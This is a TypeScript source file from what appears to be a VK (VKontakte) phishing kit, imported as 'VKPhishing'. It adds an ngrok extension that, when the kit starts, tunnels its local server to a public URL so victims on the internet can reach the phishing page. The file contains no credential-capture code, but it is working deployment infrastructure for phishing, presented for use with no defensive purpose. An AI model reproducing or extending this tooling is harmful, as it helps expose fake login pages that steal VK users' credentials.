import { existsSync, writeFileSync, readFileSync } from 'fs'
import { join } from 'path'
import { connect, kill } from 'ngrok'
import { stringify, parse } from 'yaml'
import declareExtension from './_'
import { VKPhishing } from '..'

function extension(instance: VKPhishing) {
  const localNgrokConfigPath = join(
    __dirname,
    '..',
    '..',
    'config',
    'ngrok.yml'
  )
  const globalNgrokConfigPath = join(
    process.env.HOME || '~',
    '.ngrok',
    'ngrok.yml'
  )

  let ngrokConfigPath: string

  const existsLocalConfig = existsSync(localNgrokConfigPath)
  const existsGlobalConfig = existsSync(globalNgrokConfigPath)

  if (existsLocalConfig) {
    ngrokConfigPath = localNgrokConfigPath
  } else if (existsGlobalConfig) {
    ngrokConfigPath = globalNgrokConfigPath
  } else {
    const config = stringify({
      region: 'eu'
    })

    writeFileSync(localNgrokConfigPath, config, { encoding: 'utf8' })

    ngrokConfigPath = localNgrokConfigPath
  }

  instance.on('start', async ({ port }) => {
    const publicURL = await connect({
      configPath: ngrokConfigPath,
      addr: port,
      onStatusChange: (status: 'closed' | 'connected') => {
        if (status === 'closed') {
          kill()
          const err = new Error('Ngrok tunnel has been disconnected')

          instance.emit('ngrok:error', err)

          if (existsLocalConfig) {
            const cnf = parse(
              readFileSync(localNgrokConfigPath, { encoding: 'utf8' })
            )

            if (cnf && cnf.exposeDisconnected === false) {
              return null
            } else {
              throw err
            }
          } else {
            throw err
          }
        } else if (status === 'connected') {
          return instance.emit('ngrok:connected')
        } else {
          return instance.emit('ngrok:unknown-status', status)
        }
      }
    })

    instance.emit('ngrok:ready-url', publicURL)
  })

  return instance
}

export default declareExtension(extension, {
  name: 'ngrok',
  description:
    'Extension allows bypass nat and allow access to link on the internet'
})
